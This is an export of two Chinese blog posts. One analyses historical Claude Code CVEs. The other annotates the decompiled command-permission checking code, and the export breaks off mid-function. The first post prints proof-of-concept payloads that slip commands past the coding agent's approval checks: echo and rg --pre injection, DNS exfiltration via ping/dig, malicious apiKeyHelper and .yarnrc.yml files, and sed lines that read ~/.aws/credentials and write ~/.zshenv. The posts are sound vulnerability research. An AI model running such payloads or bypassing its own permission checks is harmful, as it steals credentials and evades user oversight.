[{"title":"Claude Code 代码审计&历史漏洞分析","url":"/2026/01/03/Claude Code 代码审计&历史漏洞分析/","content":"## 前言\n\nClaude Code 出过好多漏洞了，这次统一分析下，由CC的漏洞都是本地漏洞，所以总的来说漏洞的影响面和危害程度都不能说太高，很难被利用。但是本文目的并非研究CC的漏洞，而是借助CC来尝试深入学习AI场景下大模型的攻击新范式。\n\nClaude Code 漏洞通告：https://github.com/anthropics/claude-code/security\n\nClaude Code 历史版本下载：https://www.npmjs.com/package/@anthropic-ai/claude-code?activeTab=versions\n\n集成脚本（下载+反编译源码）\n\n```sh\n#!/usr/bin/env bash\n\n# ==============================\n# 参数检查\n# ==============================\nif [ -z \"$1\" ]; then\n  echo \"用法: $0 <version>\"\n  echo \"示例: $0 1.0.0\"\n  exit 1\nfi\n\nVERSION=\"$1\"\nVERSION_DIR=\"$VERSION\"\nDECOMPILED_DIR=\"decompiled_$VERSION.js\"\nPACKAGE_NAME=\"@anthropic-ai/claude-code\"\n\necho \"==========================================\"\necho \" Claude Code 版本下载与反编译脚本\"\necho \" 版本: $VERSION\"\necho \"==========================================\"\n\n# ==============================\n# [1/4] 清理并创建目录\n# ==============================\necho \"\"\necho \"[1/4] 准备目录...\"\n\nrm -rf \"$VERSION_DIR\"\nrm -rf \"$DECOMPILED_DIR\"\nmkdir -p \"$VERSION_DIR\"\n\n# ==============================\n# [2/4] 下载指定版本的包\n# ==============================\necho \"\"\necho \"[2/4] 下载 $PACKAGE_NAME@$VERSION\"\n\ncd \"$VERSION_DIR\" || exit 1\nnpm pack \"$PACKAGE_NAME@$VERSION\"\n\n# 查找下载的 tgz 文件\nTGZ_FILE=$(ls *.tgz 2>/dev/null | head -n 1)\nif [ -z \"$TGZ_FILE\" ]; then\n  echo \"错误: 下载失败，未找到 tgz 文件\"\n  exit 1\nfi\n\necho \"已下载: $TGZ_FILE\"\n\n# ==============================\n# [3/4] 解压包\n# ==============================\necho \"\"\necho \"[3/4] 解压到 $VERSION_DIR 目录\"\ntar -xzf \"$TGZ_FILE\"\nPACKAGE_DIR=$(tar -tzf \"$TGZ_FILE\" | head -n 1 | cut -d \"/\" -f 1)\nmv \"$PACKAGE_DIR\"/* .\nrm -rf \"$PACKAGE_DIR\"\nrm \"$TGZ_FILE\"\n\ncd ..\n\n# ==============================\n# [4/4] 反编译代码\n# ==============================\necho \"\"\necho \"[4/4] 反编译代码到 $DECOMPILED_DIR\"\n\nyes | npx js-beautify \"$VERSION_DIR/cli.js\" -o \"$DECOMPILED_DIR\"\n\n# ==============================\n# 完成提示\n# ==============================\necho \"\"\necho \"==========================================\"\necho \" 完成！\"\necho \"==========================================\"\necho \"\"\n\necho \"目录结构：\"\necho \"  $VERSION_DIR/      - 原始包（可用 npx 调用）\"\necho \"  $DECOMPILED_DIR/   - 反编译后的代码\"\necho \"\"\n\necho \"使用方法：\"\necho \"  cd $VERSION_DIR\"\necho \"  npx .   # 调用该版本的 Claude Code\"\necho \"\"\n\n```\n\n## CVE-2025-52882\n\nClaude Code for VS Code 扩展 WebSocket 身份验证未授权\n\n影响版本：> 0.2.116 < 1.0.24\n\nClaude Code 的 VS Code 扩展会在本地启动⼀个 WebSocket 协议的 MCP Server（localhost +随机端⼝）\n\n低版本扩展的 WebSocket 并没有做鉴权，同时 WebSocket 协议不存在同源策略这⼀说法，因此⽤户访问的任意 Web ⽹⻚都可以与该服务器建⽴连接\n\n恶意⽹⻚可以爆破猜测 WebSocket 服务器的端⼝，然后发送 JSON RPC 指令（⽐如 tools/list 和 tool/call ）调⽤特定的 MCP ⼯具实现 RCE\n\n本地打开 VS Code 扩展⽬录搜索 x-claude-code-ide-authorization ，然后在 Unauthorized的时候输出 uuid 就可以导出 auth token 了（模拟修复前的版本）\n\n```sh\nwscat -c ws:!\"localhost:52517/ -H \"x-claude-code-ide-authorization: 443d9021-f6bc-4c1e-a0d5-f70aebd92b75\"\n```\n\nwscat 建⽴连接后直接发送 payload\n\n```sh\n{\"jsonrpc\": \"2.0\", \"id\": 1, \"method\": \"tools/list\", \"params\": {}}\n```\n\n可以读取任意⽂件，或在 Jupyter Notebook 中执⾏ Python 代码实现 RCE（需要⽤户打开 ipynb ⽂件）\n\n修复⽅式是做鉴权（添加 x-claude-code-ide-authorization header）\n\n## CVE-2025-54794\n\nClaude Code 路径前缀匹配绕过（路径遍历）\n\n影响版本：< 0.2.111\n\nClaude Code 的⽂件操作被限制在当前的⼯作⽬录（CWD）内，如果需要访问⽬录外的⽂件，则需要⽤户⼿动批准（approve）\n\n反混淆的代码在检查路径是否在⼯作⽬录中时，使⽤了 startsWith，即只匹配前缀\n\n```JavaScprit\nfunction isPathWithinCwd(filePath) {\n    return path.resolve(filePath).startsWith(path.resolve(originalCwd));\n```\n\n如果当前工作目录为`/Users/Zhuanz/Desktop/claude code`，则可以未授权访问`/Users/Zhuanz/Desktop/claude code_ext`。那么就可以结合软链接实现任意文件读取。\n\n![dcc3b1825d75c7e1565c663256c726fb.png](/resources/12a06e99318f4ace8816c421a9eadc87.png)\n\n## CVE-2025-54795\n\nClaude Code echo 命令注⼊\n\n影响版本：< 1.0.20\n\nClaude Code 将执⾏的命令分为两种：\n\n⽩名单命令：⽆需询问⽤户即可运⾏，例如 echo 、 pwd 、 whoami\n\n受限命令：需要⽤户明确批准（approve），例如 rm 、 dd 、 sudo 、 kill\n\n作者找到的⼀种利⽤ echo ⽩名单命令的命令注⼊⽅式\n\n```sh\necho \"\\\"; <COMMAND>; echo \\\"\"\n```\n\n![39357ad813a3cbd17bd39707cd7a06ed.png](/resources/1088665f0e4d4d16ac3307c67036d8b9.png)\n\n## CVE-2025-55284\n\nClaude Code ⽩名单命令 DNS 数据泄露（任意⽂件读取 + OOB）\n\n影响版本：< 1.0.4\n\n低版本的⽩名单列表包含⼀些可以发送 DNS 请求的命令，即 ping 、 nslookup 、 host 和 dig 因此可以将这些命令与 cat 、 strings 、 grep 等⽂件读取类命令组合，实现 OOB。\n\n![1072b9ebcd5f5a190d02512894b720c8.png](/resources/b093a748fbdb437a9b8e3f4a6d927529.png)\n\n## CVE-2025-58764\n\nClaude Code rg 命令注⼊\n\n影响版本：< 1.0.105\n\n旧版本的⽩名单包含 `rg` 命令![312a96820051af55f84761c269583a04.png](/resources/ef5c046b6cc84552a9736d6df02e1d53.png)\n\n利⽤`rg`的`--pre`预处理器参数即可执⾏命令，因为在⽩名单中所以不会提示⽤户是否批准\n\n```bash\n# 需要在当前⽬录下存放⼀个包含 open -a Calculator 命令的⽂件\nrg --pre=/bin/bash o\n```\n\n![5c771ca372473300ef8e18f8621548a9.png](/resources/ff528f40fe8846aaaf9cbc27da8d11a8.png)\n\n修复方案是在白名单里移除了`rg`和`grep`命令\n\n## CVE-2025-59536\n\n在 Claude Code 启动信任对话框之前执⾏命令（apiKeyHelper 命令注⼊）\n\n影响版本：< 1.0.111\n\n先看下改动。在1.0.111版本中，新增了`hasTrustDialogAccepted`参数，且默认为`False`。其在`AZ1`这个方法中被调用。该方法用作判断当前目录是否已经被标记为已接受信任。\n\n<img src=\"/resources/527a640a58b940568a561b64ef8c6f04.png\" alt=\"9b476034ed2046039548a297f2279962.png\" width=\"818\" height=\"295\" class=\"jop-noMdConv\">\n\n其在执行`apiKeyHelper`之前被调用判断是否为`True`。`apiKeyHelper`的功能是让 Claude Code ⽀持配置动态密钥（例如有些 API 会定期轮换 API Key），简单来说就是执⾏某个命令/脚本获取 API Key。\n\n<img src=\"/resources/8a7fdd065c9d4ea5935dd061949572e5.png\" alt=\"5aa204ef88c801dec23fa8c0549792ac.png\" width=\"958\" height=\"198\" class=\"jop-noMdConv\">\n\n在1.0.111之前的版本，执行`apiKeyHelper`时没有检查工作区的信任状态，导致用户打开某个未知项目时，虽然没有立即信任工作区，但已经执行了`apiKeyHelper`，导致RCE。\n\n`apiKeyHelper` 配置路径：\n\n- `.claude/settings.json`：当前项⽬⽬录（优先级更⾼）\n    \n    &nbsp;\n    \n- `～/.claude.json`：⽤户 HOME ⽬录\n    \n\n```json\n{\n    \"apiKeyHelper\": \"open -a Calculator\"\n}\n```\n\n![34fecb3093a06ddadf9ab183219d2531.png](/resources/4a40c5da757940c880826a78ac9c5d52.png)\n\n## CVE-2025-59828、CVE-2025-65099\n\nClaude Code Yarn 插件代码执⾏漏洞\n\n影响版本：< 1.0.39\n\nClaude Code在提示是否信任工作区之前，会执行`yarn --version`命令。来判断是否有yarn包管理器。\n\n<img src=\"/resources/f7caf47014a34c74a48071e33644973e.png\" alt=\"080fad59146d45828dc8afade36d0d73.png\" width=\"588\" height=\"499\" class=\"jop-noMdConv\">\n\nYarn 包管理器⽀持在项⽬⽬录下设置 `.yarnrc.yml` 配置⽂件，可以利⽤某些参数加载⾃定义 js 实现RCE\n\n- yarnPath：指定 yarn 命令路径\n- plugins：加载⾃定义插件\n\n恶意JS\n\n```javascript\n!#/usr/bin/env node\nrequire('child_process').execSync('open -a Calculator');\nconsole.log('1.0.0');\n```\n\n恶意`.yarnrc.yml`\n\n```yaml\n# 选项 1：执⾏⾃定义 yarn ⼆进制⽂件\nyarnPath: ./malicious.js\n# 选项 2：加载恶意插件\nplugins:\n - path: ./malicious.js\n   spec: \"\"\n```\n\n![47fa63bc74f23b5a1318a15d52d07eb4.png](/resources/44921655c13c47bd9b6799d6e483aefc.png)\n\n漏洞触发的前提条件是开启遥测功能，换句话说就是不能设置下列环境变量（`.claude/settings.json`同理）\n\n<img src=\"/resources/6d7fe781aaaf464cb4a687023857536f.png\" alt=\"a87c2e68254fa5f86d2623cc7cb7f976.png\" width=\"883\" height=\"165\" class=\"jop-noMdConv\">\n\n新版本的修复方式是新增了一个方法`ih`，先通过`findActualExecutable`方法查找可执行文件，并检查文件权限是否可执行但不运行`yarn --version`。\n\n<img src=\"/resources/a1f23fc246d4409abf93efef9d93ca8d.png\" alt=\"bd5c7b768656ff537dc93f2f86dfab57.png\" width=\"527\" height=\"329\" class=\"jop-noMdConv\">\n\n## CVE-2025-64755\n\nClaude Code sed 命令注入（任意文件读写）\n\n影响版本：< 2.0.31\n\nClaude Code 在执⾏命令时会使⽤正则表达式 + Haiku LLM 辅助判断，以此判断是否要⾃动执⾏ or 需要⽤户⼿动批准\n\n简单来说 checkPermissions 具备四种类型，详情可以看另一篇[文章](https://hex0rc1st.github.io/2025/12/20/%E5%B8%86%E8%BD%AFFineReport-Export-excel-%E6%9C%AA%E6%8E%88%E6%9D%83SQL%E6%B3%A8%E5%85%A5%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/)：\n\n- Deny：明确拒绝\n- Allow：⽆需提示⽤户即可执⾏\n- Ask：提示⽤户征求许可\n- Passthrough：继续进⾏进⼀步检查，返回 Allow 或 Ask\n\nLLM辅助判断提示词所用命令：\n\n![e524e7632a1afae98ef2e2e96309dd6e.png](/resources/a7adcd9970b049409ead13596fc63bf2.png)\n\n除此之外，还对各种常见命令的参数做了限制。\n\nhttps://gist.github.com/xpn/a43ba31a74ca3beea5b631237818eb46\n\n任意读写 payload。写⼊ `.zshenv` 即可在⽤户打开 shell 时触发 RCE\n\n```bash\n# Write files\necho 'runme' | sed 'w /Users/xpn/.zshenv'\necho echo '123' | sed -n '1,1w/Users/xpn/.zshenv'\n# Read Files\necho 1 | sed 'r/Users/xpn/.aws/credentials'\n\n```\n\n## CVE-2025-66032\n\nClaude Code 命令验证绕过实现任意代码执⾏\n\n该漏洞同样是由于命令执行过程中过滤不当导致绕过Claude Code的`checkPermissions`机制。\n\n修复代码新增了对于IFS的检测\n\n<img src=\"/resources/31a0b5f0b9f940559a789a781dbfcd31.png\" alt=\"b50efc4985db5efc0d7dd4cb276b52dc.png\" width=\"702\" height=\"232\">\n\n以及对 `short-flag` 的检测\n\n<img src=\"/resources/76e8f1347c354a3a933a75b914502392.png\" alt=\"eb5fd54b8e312588d89376f07bfe83ec.png\" width=\"671\" height=\"341\">\n\n该正则表达式检测以下模式：\n\n- `''-`：两个单引号后跟 flag\n- `\"\"-`：两个双引号后跟 flag\n- `''\"-` 或 `\"''-` ：混合引号后跟 flag\n\n## 总结\n\n随着 **AI Coding 能力的持续演进**，为了进一步提升开发效率，系统势必会将越来越多的**执行权限**下放给 AI。然而，**如何在自动化执行场景中准确区分“正常命令”与“恶意命令”**，本身就是一个边界极其模糊、且难以形式化定义的问题。\n\n在这一背景下，即便引入权限校验与安全策略，也很难从根本上消除风险。以 **Claude Code** 为例，其安全机制在很大程度上依赖于对命令语义的判断与 `checkPermissions` 等鉴权逻辑的约束。但在可预见的未来，**漏洞研究的重心仍将集中在通过构造复杂、组合式或语义混淆的命令，绕过其既有鉴权机制**。\n\n换言之，只要 AI 被赋予了足够强的执行能力，而安全判断仍停留在规则或静态语义层面，**攻击者就始终存在利用“合法外壳承载恶意意图”的空间**。这也意味着，AI Coding 场景下的安全问题，短期内并不会随着能力增强而自然消失，反而可能因权限扩大而进一步放大。","tags":["AI安全","Claude Code","JavaScript"],"categories":["AI安全","漏洞分析"]},{"title":"Claude Code checkPermissions 执行命令检测逻辑分析","url":"/2026/01/03/Claude Code checkPermissions 执行命令检测逻辑分析/","content":"\n## 概述\n本报告基于 Claude Code 版本 1.0.92 的反编译代码 (`deobfuscated.js`)，详细分析 Claude Code 在执行命令时如何检测是否需要用户批准的完整机制，并附上关键函数的完整源码和详细注释。\n\n---\n\n## 目录\n1. [Behavior 类型系统](#一behavior-类型系统)\n2. [完整检测流程图](#二完整检测流程图)\n3. [关键函数源码解析](#三关键函数源码解析)\n4. [命令注入检测详解](#四命令注入检测详解)\n5. [安全命令白名单](#五安全命令白名单)\n6. [路径受限命令验证](#六路径受限命令验证)\n7. [只读命令检测与自动后台执行](#七只读命令检测与自动后台执行)\n8. [命令解析辅助函数](#八命令解析辅助函数)\n9. [环境变量控制](#九环境变量控制)\n10. [总结](#十总结)\n\n---\n\n## 一、Behavior 类型系统\n### 1.1 四种 Behavior 类型\n| 行为类型 | 说明 | 使用场景 |\n| --- | --- | --- |\n| **allow** | 允许执行，无需用户批准 | 匹配到允许规则、只读命令、安全白名单命令 |\n| **deny** | 拒绝执行，禁止运行 | 匹配到拒绝规则 |\n| **ask** | 需要用户批准后才能执行 | 检测到潜在风险、匹配到询问规则 |\n| **passthrough** | 通过当前检查，继续下一阶段验证 | 当前检查未发现问题，需要进一步验证 |\n\n\n### 1.2 规则存储结构\n```javascript\n// 根据行为类型映射到不同的规则集合\n// 代码位置: deobfuscated.js:357360\nlet rulesKey = behavior === \"allow\" ? \"alwaysAllowRules\"\n            : behavior === \"deny\" ? \"alwaysDenyRules\"\n            : \"alwaysAskRules\";\n```\n\n规则来源包括：\n\n+ `localSettings` - 本地配置\n+ `cliArg` - 命令行参数\n+ `command` - 命令级别\n+ `session` - 会话级别（不支持修改）\n\n---\n\n## 二、完整检测流程图\n### 2.1 checkPermissions 完整检测流程\n![2a3e238c159ea6f468792c33e684c5df.png](/resources/2a3e238c159ea6f468792c33e684c5df.png)\n\n---\n\n### 2.2 流程图说明\n上图展示了从 `checkPermissions` 入口到最终决策的完整流程，主要包含以下阶段：\n\n| 阶段 | 函数 | 代码位置 | 说明 |\n| --- | --- | --- | --- |\n| **入口** | `I9.checkPermissions()` | 396957 | Sandbox 检查，直接允许或进入主检测 |\n| **主检测** | `mH0()` | 396644 | 异步主检测函数，协调所有检查步骤 |\n| **精确匹配** | `uH0()` | 396491 | 用户配置规则的精确匹配检查 |\n| **管道检测** | `de2()` | 396024 | 检测管道操作和多命令组合 |\n| **模式检查** | `te2()` | 396539 | 前缀匹配、路径验证、模式特定行为 |\n| **路径验证** | `ae2()`, `iS6()` | 396360, 396343 | 验证受限命令的访问路径 |\n| **只读检测** | `I9.isReadOnly()` | 396926 | 判断命令是否只读（可能自动允许） |\n| **注入检测** | `Rx()` | 392010 | 命令注入模式检测 |\n| **用户交互** | - | 396701 | 必要时请求用户批准 |\n| **最终决策** | `re2()` | 396612 | 综合所有检查结果做出最终决策 |\n\n\n---\n\n## 三、关键函数源码解析\n### 3.1 主检测函数 `mH0()` - 异步多命令检测\n**代码位置**: `deobfuscated.js:396644`\n\n```javascript\nvar mH0 = async (A, B, Q = rr2) => {\n  // A: 命令对象 { command: \"...\" }\n  // B: 权限上下文\n  // Q: 子命令处理函数 (默认 rr2)\n\n  // 步骤 1: 检查用户配置的精确匹配规则\n  let Z = uH0(A, B.getToolPermissionContext());\n  if (Z.behavior === \"deny\") {\n    return Z;  // 拒绝规则匹配，直接拒绝\n  }\n\n  // 步骤 2: 检测管道操作和多命令\n  let G = await de2(A, w => mH0(w, B, Q), B.getToolPermissionContext());\n  if (G.behavior !== \"passthrough\") {\n    return G;  // 管道检测发现问题\n  }\n\n  // 步骤 3: 过滤掉 cd 到当前目录的命令\n  let Y = PU(A.command).filter(w => {\n    if (w === `cd ${r0()}`) {\n      return false;  // 移除 \"cd .\" 类型的命令\n    }\n    return true;\n  });\n\n  // 步骤 4: 检测多个目录切换命令\n  if (Y.filter(w => w.startsWith(\"cd \")).length > 1) {\n    let w = {\n      type: \"other\",\n      reason: \"Multiple directory changes in one command require approval for clarity\"\n    };\n    return {\n      behavior: \"ask\",\n      decisionReason: w,\n      message: pF(B.getToolPermissionContext(), I9.name, w)\n    };\n  }\n\n  // 步骤 5: 检查每个子命令\n  let W = Y.map(w => te2({ command: w }, B.getToolPermissionContext()));\n\n  // 步骤 5.1: 如果有子命令被拒绝，整体拒绝\n  if (W.find(w => w.behavior === \"deny\") !== undefined) {\n    return {\n      behavior: \"deny\",\n      message: `Permission to use ${I9.name} with command ${A.command} has been denied.`,\n      decisionReason: {\n        type: \"subcommandResults\",\n        reasons: new Map(W.map((w, N) => [Y[N], w]))\n      }\n    };\n  }\n\n  // 步骤 5.2: 如果有子命令需要询问，整体询问\n  let X = W.find(w => w.behavior === \"ask\");\n  if (X !== undefined) {\n    return X;\n  }\n\n  // 步骤 6: 如果精确匹配允许，直接允许\n  if (Z.behavior === \"allow\") {\n    return Z;\n  }\n\n  // 步骤 7: 检查命令注入（可被环境变量禁用）\n  let F = Q9(process.env.CLAUDE_CODE_DISABLE_COMMAND_INJECTION_CHECK)\n      ? false\n      : Y.some(w => Rx(w).behavior !== \"passthrough\");\n\n  // 步骤 8: 所有子命令都允许且无注入风险，整体允许\n  if (W.every(w => w.behavior === \"allow\") && !F) {\n    return {\n      behavior: \"allow\",\n      updatedInput: A,\n      decisionReason: {\n        type: \"subcommandResults\",\n        reasons: new Map(W.map((w, N) => [Y[N], w]))\n      }\n    };\n  }\n\n  // 步骤 9: 需要用户交互确认\n  let V = await Q(A.command, B.abortController.signal, B.options.isNonInteractiveSession);\n  if (B.abortController.signal.aborted) {\n    throw new gF();  // 用户中止\n  }\n\n  // 步骤 10: 根据用户确认结果进行最终决策\n  let K = B.getToolPermissionContext();\n  if (Y.length === 1) {\n    return re2({ command: Y[0] }, K, V);  // 单命令，直接决策\n  }\n\n  // 多命令情况，收集所有需要询问的规则\n  let H = new Map();\n  for (let w of Y) {\n    if (w.behavior === \"ask\" || w.behavior === \"passthrough\") {\n      let N = \"suggestions\" in w ? w.suggestions : undefined;\n      let L = Ok(N);  // 处理建议规则\n      for (let M of L) {\n        let key = M.source;\n        if (!H.has(key)) {\n          H.set(key, []);\n        }\n        H.get(key).push(M);\n      }\n    }\n  }\n\n  let z = H.size > 0 ? {\n    type: \"other\",\n    reason: \"Permissions for these commands have been granted in the current session\",\n    source: \"session\"\n  } : {\n    type: \"mode\",\n    mode: K.mode,\n    reason: `Running in ${K.mode} mode`\n  };\n\n  let C = H.size > 0 ? [{\n    type: \"addRules\",\n    rules: Array.from(H.values()).flat(),\n    source: \"localSettings\"\n  }] : undefined;\n\n  return {\n    behavior: \"passthrough\",\n    message: pF(K, I9.name, z),\n    decisionReason: z,\n    suggestions: C\n  };\n};\n```\n\n---\n\n### 3.2 用户规则匹配函数 `uH0()` - 精确匹配\n**代码位置**: `deobfuscated.js:396491`\n\n```javascript\nvar uH0 = (A, B) => {\n  // A: 命令对象 { command: \"...\" }\n  // B: 权限上下文\n\n  let Q = A.command.trim();\n\n  // 获取匹配的规则（精确匹配模式）\n  let {\n    matchingDenyRules: Z,    // 拒绝规则\n    matchingAskRules: G,     // 询问规则\n    matchingAllowRules: Y    // 允许规则\n  } = oe2(A, B, \"exact\");\n\n  // 优先级 1: 拒绝规则优先\n  if (Z[0] !== undefined) {\n    return {\n      behavior: \"deny\",\n      message: `Permission to use ${I9.name} with command ${Q} has been denied.`,\n      decisionReason: {\n        type: \"rule\",\n        rule: Z[0]  // 返回第一个匹配的拒绝规则\n      }\n    };\n  }\n\n  // 优先级 2: 询问规则\n  if (G[0] !== undefined) {\n    return {\n      behavior: \"ask\",\n      message: pF(B, I9.name),\n      decisionReason: {\n        type: \"rule\",\n        rule: G[0]\n      }\n    };\n  }\n\n  // 优先级 3: 允许规则\n  if (Y[0] !== undefined) {\n    return {\n      behavior: \"allow\",\n      updatedInput: A,\n      decisionReason: {\n        type: \"rule\",\n        rule: Y[0]\n      }\n    };\n  }\n\n  // 无匹配规则，继续下一步检查\n  let I = {\n    type: \"other\",\n    reason: \"This command requires approval\"\n  };\n  return {\n    behavior: \"passthrough\",\n    message: pF(B, I9.name, I),\n    decisionReason: I,\n    suggestions: hH0(Q)  // 返回建议规则供用户添加\n  };\n};\n```\n\n---\n\n### 3.3 前缀匹配和路径验证函数 `te2()`\n**代码位置**: `deobfuscated.js:396539`\n\n```javascript\nvar te2 = (A, B) => {\n  // A: 命令对象 { command: \"...\" }\n  // B: 权限上下文\n\n  let Q = A.command.trim();\n\n  // 步骤 1: 先检查精确匹配规则\n  let Z = uH0(A, B);\n  if (Z.behavior === \"deny\" || Z.behavior === \"ask\") {\n    return Z;\n  }\n\n  // 步骤 2: 检查前缀匹配规则\n  let {\n    matchingDenyRules: G,\n    matchingAskRules: Y,\n    matchingAllowRules: I\n  } = oe2(A, B, \"prefix\");\n\n  // 前缀匹配的拒绝规则\n  if (G[0] !== undefined) {\n    return {\n      behavior: \"deny\",\n      message: `Permission to use ${I9.name} with command ${Q} has been denied.`,\n      decisionReason: {\n        type: \"rule\",\n        rule: G[0]\n      }\n    };\n  }\n\n  // 前缀匹配的询问规则\n  if (Y[0] !== undefined) {\n    return {\n      behavior: \"ask\",\n      message: pF(B, I9.name),\n      decisionReason: {\n        type: \"rule\",\n        rule: Y[0]\n      }\n    };\n  }\n\n  // 如果精确匹配已允许，直接返回\n  if (Z.behavior === \"allow\") {\n    return Z;\n  }\n\n  // 前缀匹配的允许规则\n  if (I[0] !== undefined) {\n    return {\n      behavior: \"allow\",\n      updatedInput: A,\n      decisionReason: {\n        type: \"rule\",\n        rule: I[0]\n      }\n    };\n  }\n\n  // 步骤 3: 路径验证（ae2）\n  let W = ae2(A, r0(), B);\n  if (W.behavior !== \"passthrough\") {\n    return W;\n  }\n\n  // 步骤 4: 模式特定行为验证（se2）\n  let J = se2(A, B);\n  if (J.behavior !== \"passthrough\") {\n    return J;\n  }\n\n  // 步骤 5: 只读命令自动允许\n  if (I9.isReadOnly(A)) {\n    return {\n      behavior: \"allow\",\n      updatedInput: A,\n      decisionReason: {\n        type: \"other\",\n        reason: \"Read-only command is allowed\"\n      }\n    };\n  }\n\n  // 未通过任何检查，继续下一步\n  let X = {\n    type: \"other\",\n    reason: \"This command requires approval\"\n  };\n  return {\n    behavior: \"passthrough\",\n    message: pF(B, I9.name, X),\n    decisionReason: X,\n    suggestions: hH0(Q)\n  };\n};\n```\n\n---\n\n### 3.4 规则匹配辅助函数 `oe2()`\n**代码位置**: `deobfuscated.js:396478`\n\n```javascript\nfunction oe2(A, B, Q) {\n  // A: 命令对象\n  // B: 权限上下文\n  // Q: 匹配模式 (\"exact\" | \"prefix\")\n\n  // 获取所有来源的拒绝规则并过滤匹配\n  let Z = _k(B, I9, \"deny\");\n  let G = fH0(A, Z, Q);\n\n  // 获取所有来源的询问规则并过滤匹配\n  let Y = _k(B, I9, \"ask\");\n  let I = fH0(A, Y, Q);\n\n  // 获取所有来源的允许规则并过滤匹配\n  let W = _k(B, I9, \"allow\");\n  let J = fH0(A, W, Q);\n\n  return {\n    matchingDenyRules: G,\n    matchingAskRules: I,\n    matchingAllowRules: J\n  };\n}\n```\n\n---\n\n### 3.5 规则过滤函数 `fH0()`\n**代码位置**: `deobfuscated.js:396461`\n\n```javascript\nfunction fH0(A, B, Q) {\n  // A: 命令对象 { command: \"...\" }\n  // B: 规则 Map (来源 -> 规则列表)\n  // Q: 匹配模式 (\"exact\" | \"prefix\")\n\n  let Z = A.command.trim();\n\n  // 过滤出匹配的规则\n  return Array.from(B.entries()).filter(([G]) => {\n    let Y = oS6(G);  // 解析规则类型和内容\n\n    switch (Y.type) {\n      case \"exact\":\n        // 精确匹配: 命令必须完全相等\n        return Y.command === Z;\n\n      case \"prefix\":\n        // 前缀匹配\n        switch (Q) {\n          case \"exact\":\n            // 在 exact 模式下，前缀必须完全相等\n            return Y.prefix === Z;\n          case \"prefix\":\n            // 在 prefix 模式下，命令以前缀开头\n            return Z.startsWith(Y.prefix);\n        }\n    }\n  }).map(([, G]) => G);  // 返回匹配的规则数组\n}\n```\n\n---\n\n### 3.6 最终决策函数 `re2()`\n**代码位置**: `deobfuscated.js:396612`\n\n```javascript\nfunction re2(A, B, Q) {\n  // A: 命令对象\n  // B: 权限上下文\n  // Q: 用户交互结果\n\n  // 步骤 1: 用户规则检查\n  let Z = uH0(A, B);\n  if (Z.behavior !== \"passthrough\") {\n    return Z;\n  }\n\n  // 步骤 2: 命令模式检查\n  let G = te2(A, B);\n  if (G.behavior === \"deny\" || G.behavior === \"ask\") {\n    return G;\n  }\n\n  // 步骤 3: 命令注入检测（可被环境变量禁用）\n  if (!Q9(process.env.CLAUDE_CODE_DISABLE_COMMAND_INJECTION_CHECK)) {\n    let I = Rx(A.command);\n    if (Q?.commandInjectionDetected || I.behavior !== \"passthrough\") {\n      let W = {\n        type: \"other\",\n        reason: I.behavior === \"ask\" && I.message\n          ? I.message\n          : \"This command contains patterns that could pose security risks and requires approval\"\n      };\n      return {\n        behavior: \"ask\",\n        message: pF(B, I9.name, W),\n        decisionReason: W\n      };\n    }\n  }\n\n  // 步骤 4: 如果模式检查允许，直接允许\n  if (G.behavior === \"allow\") {\n    return G;\n  }\n\n  // 步骤 5: 返回建议规则\n  let Y = Q && !Q.commandInjectionDetected && Q.commandPrefix\n    ? rS6(Q.commandPrefix)\n    : hH0(A.command);\n\n  return {\n    ...G,\n    suggestions: Y\n  };\n}\n```\n\n---\n\n### 3.7 管道操作检测函数 `de2()`\n**代码位置**: `deobfuscated.js:396024`\n\n```javascript\nasync function de2(A, B, Q) {\n  // A: 命令对象\n  // B: 子命令处理函数\n  // Q: 权限上下文\n\n  // 步骤 1: 检测是否为多命令组合（使用 shell 操作符）\n  if (tr2(A.command)) {\n    // 多命令需要先检查命令注入\n    let Y = Rx(A.command);\n    let I = {\n      type: \"other\",\n      reason: Y.behavior === \"ask\" && Y.message\n        ? Y.message\n        : \"This command uses shell operators that require approval for safety\"\n    };\n    return {\n      behavior: \"ask\",\n      message: pF(Q, I9.name, I),\n      decisionReason: I\n    };\n  }\n\n  // 步骤 2: 解析命令并检测管道操作符\n  let Z = uK0(A.command);  // 使用 shell-quote 解析\n  let G = Z.findIndex(Y => Y === \"|\");\n\n  // 步骤 3: 如果发现管道，进行特殊处理\n  if (G >= 0) {\n    let Y = Z.slice(0, G);   // 管道左边的命令\n    let I = Z.slice(G + 1);  // 管道右边的命令\n    return xS6(A, Y, I, B, Q);  // 调用管道处理函数\n  }\n\n  // 无特殊操作符\n  return {\n    behavior: \"passthrough\",\n    message: \"No special operators found in command\"\n  };\n}\n```\n\n---\n\n### 3.8 管道命令处理函数 `xS6()`\n**代码位置**: `deobfuscated.js:395965`\n\n```javascript\nasync function xS6(A, B, Q, Z, G) {\n  // A: 原始命令对象\n  // B: 管道左边的命令数组\n  // Q: 管道右边的命令数组\n  // Z: 子命令处理函数\n  // G: 权限上下文\n\n  // 步骤 1: 递归检查管道左边的命令\n  let Y = B.join(\" \").trim();\n  let I = await Z({ ...A, command: Y });\n\n  // 步骤 2: 检查管道右边的命令是否为只读命令\n  let W = mK0(Q).every(D => {\n    return I9.isReadOnly({ ...A, command: D.trim() });\n  });\n\n  // 步骤 3: 检查管道右边的命令\n  let J = Q.join(\" \").trim();\n  let X = {\n    type: \"other\",\n    reason: W\n      ? \"Pipe right-hand command is read-only\"\n      : \"The piped command sequence requires approval\"\n  };\n\n  // 步骤 4: 根据只读性质决定行为\n  let F = W\n    ? {\n        behavior: \"allow\",\n        updatedInput: A,\n        decisionReason: X\n      }\n    : {\n        behavior: \"ask\",\n        message: pF(G, I9.name, X),\n        decisionReason: X\n      };\n\n  // 步骤 5: 组合两边的检查结果\n  let V = new Map([[Y, I], [J, F]]);\n\n  // 如果任一边被拒绝，整体拒绝\n  if (I.behavior === \"deny\") {\n    return {\n      behavior: \"deny\",\n      message: I.message,\n      decisionReason: {\n        type: \"subcommandResults\",\n        reasons: V\n      }\n    };\n  }\n\n  // 如果两边都允许，整体允许\n  if (I.behavior === \"allow\" && F.behavior === \"allow\") {\n    return {\n      behavior: \"allow\",\n      updatedInput: A,\n      decisionReason: {\n        type: \"subcommandResults\",\n        reasons: V\n      }\n    };\n  }\n\n  // 否则需要询问\n  let K = F.behavior === \"allow\"\n    ? I.behavior !== \"allow\" && \"suggestions\" in I ? I.suggestions : undefined\n    : undefined;\n\n  let H = {\n    type: \"subcommandResults\",\n    reasons: V\n  };\n\n  return {\n    behavior: \"ask\",\n    message: pF(G, I9.name, 